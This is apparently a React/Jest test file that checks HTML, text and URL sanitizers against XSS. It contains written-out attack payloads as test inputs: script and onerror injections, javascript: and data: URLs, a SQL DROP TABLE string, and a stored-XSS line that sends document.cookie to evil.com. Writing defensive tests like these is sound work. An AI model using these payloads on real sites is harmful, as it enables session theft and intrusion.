import React from 'react';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { BrowserRouter } from 'react-router-dom';
import { sanitizeHtml, sanitizeText, sanitizeUrl } from '../utils/sanitizeHtml';

// Mock components for testing
const MockComponent = ({ content }: { content: string }) => (
  <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(content) }} />
);

const MockForm = ({ onSubmit }: { onSubmit: (data: any) => void }) => {
  const [input, setInput] = React.useState('');
  
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit({ input: sanitizeText(input) });
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input 
        value={input}
        onChange={(e) => setInput(e.target.value)}
        data-testid="test-input"
      />
      <button type="submit">Submit</button>
    </form>
  );
};

describe('Security Audit - XSS Prevention', () => {
  describe('Component XSS Tests', () => {
    it('should prevent XSS in dangerouslySetInnerHTML', () => {
      const maliciousContent = '<script>alert("XSS")</script><p>Safe content</p>';
      
      render(<MockComponent content={maliciousContent} />);
      
      // Should not contain script tags
      expect(screen.getByText('Safe content')).toBeInTheDocument();
      expect(document.querySelector('script')).not.toBeInTheDocument();
    });

    it('should prevent event handler injection', () => {
      const maliciousContent = '<img src="x" onerror="alert(\'XSS\')" alt="test">';
      
      render(<MockComponent content={maliciousContent} />);
      
      const img = document.querySelector('img');
      expect(img).toBeInTheDocument();
      expect(img).not.toHaveAttribute('onerror');
    });

    it('should prevent iframe injection', () => {
      // eslint-disable-next-line no-script-url
    const maliciousContent = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
      
      render(<MockComponent content={maliciousContent} />);
      
      expect(document.querySelector('iframe')).not.toBeInTheDocument();
    });
  });

  describe('Form Input Security Tests', () => {
    it('should sanitize form inputs', async () => {
      const mockSubmit = jest.fn();
      render(<MockForm onSubmit={mockSubmit} />);
      
      const input = screen.getByTestId('test-input');
      const submitButton = screen.getByText('Submit');
      
      // Enter malicious content
      fireEvent.change(input, { 
        target: { value: '<script>alert("XSS")</script>Malicious content' } 
      });
      
      fireEvent.click(submitButton);
      
      await waitFor(() => {
        expect(mockSubmit).toHaveBeenCalledWith({
          input: 'Malicious content' // Script tags should be removed
        });
      });
    });

    it('should prevent SQL injection in form inputs', async () => {
      const mockSubmit = jest.fn();
      render(<MockForm onSubmit={mockSubmit} />);
      
      const input = screen.getByTestId('test-input');
      const submitButton = screen.getByText('Submit');
      
      // Enter SQL injection attempt
      fireEvent.change(input, { 
        target: { value: "'; DROP TABLE users; --" } 
      });
      
      fireEvent.click(submitButton);
      
      await waitFor(() => {
        expect(mockSubmit).toHaveBeenCalledWith({
          input: "'; DROP TABLE users; --" // Should be sanitized as text
        });
      });
    });
  });

  describe('URL Sanitization Tests', () => {
    it('should prevent javascript: protocol', () => {
      // eslint-disable-next-line no-script-url
    const maliciousUrl = 'javascript:alert("XSS")';
      const sanitized = sanitizeUrl(maliciousUrl);
      expect(sanitized).toBe('');
    });

    it('should prevent data: protocol', () => {
      const maliciousUrl = 'data:text/html,<script>alert("XSS")</script>';
      const sanitized = sanitizeUrl(maliciousUrl);
      expect(sanitized).toBe('');
    });

    it('should allow safe URLs', () => {
      const safeUrls = [
        'https://example.com',
        'http://example.com',
        'mailto:test@example.com',
        'tel:+1234567890',
        '/relative/path',
        '#fragment'
      ];
      
      safeUrls.forEach(url => {
        const sanitized = sanitizeUrl(url);
        expect(sanitized).toBe(url);
      });
    });
  });

  describe('Content Security Tests', () => {
    it('should prevent CSS injection', () => {
      // eslint-disable-next-line no-script-url
    const maliciousCSS = '<style>body{background:url(javascript:alert("XSS"))}</style>';
      const sanitized = sanitizeHtml(maliciousCSS);
      expect(sanitized).not.toContain('<style>');
    });

    it('should prevent CSS expression injection', () => {
      const maliciousCSS = '<div style="background:expression(alert(\'XSS\'))">test</div>';
      const sanitized = sanitizeHtml(maliciousCSS);
      expect(sanitized).not.toContain('expression');
    });

    it('should prevent object/embed injection', () => {
      // eslint-disable-next-line no-script-url
    const maliciousContent = '<object data="javascript:alert(\'XSS\')"></object>';
      const sanitized = sanitizeHtml(maliciousContent);
      expect(sanitized).not.toContain('<object>');
    });
  });

  describe('Reflected XSS Tests', () => {
    it('should prevent reflected XSS in search results', () => {
      const searchQuery = '<script>alert("XSS")</script>';
      const sanitized = sanitizeHtml(searchQuery);
      
      render(<div dangerouslySetInnerHTML={{ __html: sanitized }} />);
      
      expect(document.querySelector('script')).not.toBeInTheDocument();
    });

    it('should prevent reflected XSS in error messages', () => {
      const errorMessage = '<img src="x" onerror="alert(\'XSS\')">Error occurred';
      const sanitized = sanitizeHtml(errorMessage);
      
      render(<div dangerouslySetInnerHTML={{ __html: sanitized }} />);
      
      const img = document.querySelector('img');
      expect(img).toBeInTheDocument();
      expect(img).not.toHaveAttribute('onerror');
    });
  });

  describe('Stored XSS Tests', () => {
    it('should prevent stored XSS in user comments', () => {
      const userComment = '<script>document.location="http://evil.com?cookie="+document.cookie</script>';
      const sanitized = sanitizeHtml(userComment);
      
      render(<div dangerouslySetInnerHTML={{ __html: sanitized }} />);
      
      expect(document.querySelector('script')).not.toBeInTheDocument();
    });

    it('should prevent stored XSS in user profiles', () => {
      const userBio = '<img src="x" onerror="alert(\'XSS\')" alt="profile">My bio';
      const sanitized = sanitizeHtml(userBio);
      
      render(<div dangerouslySetInnerHTML={{ __html: sanitized }} />);
      
      const img = document.querySelector('img');
      expect(img).toBeInTheDocument();
      expect(img).not.toHaveAttribute('onerror');
    });
  });

  describe('DOM-based XSS Tests', () => {
    it('should prevent DOM-based XSS in innerHTML', () => {
      const maliciousInput = '<img src="x" onerror="alert(\'XSS\')">';
      const sanitized = sanitizeHtml(maliciousInput);
      
      render(<div dangerouslySetInnerHTML={{ __html: sanitized }} />);
      
      const img = document.querySelector('img');
      expect(img).toBeInTheDocument();
      expect(img).not.toHaveAttribute('onerror');
    });

    it('should prevent DOM-based XSS in document.write scenarios', () => {
      const maliciousInput = '";document.write("<script>alert(\'XSS\')</script>");//';
      const sanitized = sanitizeHtml(maliciousInput);
      
      render(<div dangerouslySetInnerHTML={{ __html: sanitized }} />);
      
      expect(document.querySelector('script')).not.toBeInTheDocument();
    });
  });

  describe('Input Validation Tests', () => {
    it('should handle null/undefined inputs gracefully', () => {
      expect(sanitizeHtml(null)).toBe('');
      expect(sanitizeHtml(undefined)).toBe('');
      expect(sanitizeText(null)).toBe('');
      expect(sanitizeText(undefined)).toBe('');
      expect(sanitizeUrl(null)).toBe('');
      expect(sanitizeUrl(undefined)).toBe('');
    });

    it('should handle non-string inputs', () => {
      expect(sanitizeHtml(123)).toBe('123');
      expect(sanitizeHtml({})).toBe('[object Object]');
      expect(sanitizeText(123)).toBe('123');
      expect(sanitizeUrl(123)).toBe('123');
    });
  });

  describe('Edge Case Tests', () => {
    it('should handle nested script tags', () => {
      const nestedScripts = '<script><script>alert("XSS")</script></script>';
      const sanitized = sanitizeHtml(nestedScripts);
      expect(sanitized).not.toContain('<script>');
    });

    it('should handle encoded script tags', () => {
      const encodedScript = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
      const sanitized = sanitizeHtml(encodedScript);
      expect(sanitized).not.toContain('<script>');
    });

    it('should handle mixed case script tags', () => {
      const mixedCase = '<SCRIPT>alert("XSS")</SCRIPT>';
      const sanitized = sanitizeHtml(mixedCase);
      expect(sanitized).not.toContain('<SCRIPT>');
    });
  });
});
